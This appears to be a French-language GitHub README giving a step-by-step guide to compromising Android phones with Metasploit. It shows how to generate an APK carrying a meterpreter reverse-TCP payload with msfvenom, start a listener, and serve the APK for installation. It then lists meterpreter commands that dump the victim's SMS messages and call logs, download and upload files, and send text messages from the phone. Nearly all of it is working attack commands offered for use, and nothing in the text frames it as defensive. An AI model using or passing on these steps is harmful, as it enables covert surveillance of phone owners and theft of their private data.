# android-metasploit
Installer et configure android metasploit dans un serveur


# Installation

### Metasploit
- pour install metasploit executer la commande suivante dans le terminal de la machine. pour plus de detail <a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">visitez ici</a>

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

### Générer le fichier apk

```
cd /opt/metasploit-framework/bin
```

```
sudo msfvenom -p android/meterpreter_reverse_tcp LHOST=<IP de l'hôte> LPORT=<porte souhaité> -o /data/omg.apk
```

### Démarrer le metasploit
```
msfconsole

use exploit/multi/handler

set payload android/meterpreter_reverse_tcp

set lhost <IP de l'hôte>
set lport <port utilisé ci-dessus>

run
```

## Ça y est
Il reste qu'à install le fichier apk dans un téléphone android.

- démarrer server python heberger local pour le test
```
python3 -m http.server <port>
```



# Les commands 
Utilisation de command pour manipuler le téléphone android depuis le terminal metasploit.


- Recuperer tous les sms
```
dump_sms 
```

- Recuperer tous les historique des appels
```
dump_calllog
```


- Recuperer un fichier ou dossier
```
download /lechemin/vers/lefichier-ou-dossier-a/telecharger /chemin/de/suavegarde
```


- Envoyer un fichier ou dossier
```
upload /chemin/de/depuis/leserveur /lechemin/vers/android
```


- Envoyer sms
```
send_sms -d "numero de distination" "contenu du message"
```


- Quelque commands habituel
```
cd

pwd

ls
```


- dossier racine android
```
cd /storage/emulated/0 ou cd /sdcard
```


## Ressource
plus d'infos concernant l'installation de metasploit android:
https://www.dropbox.com/s/axudgf8w8vvjjbx/OMG%20Cable%20Android%20APK%20-%20Linode.pdf?dl=0


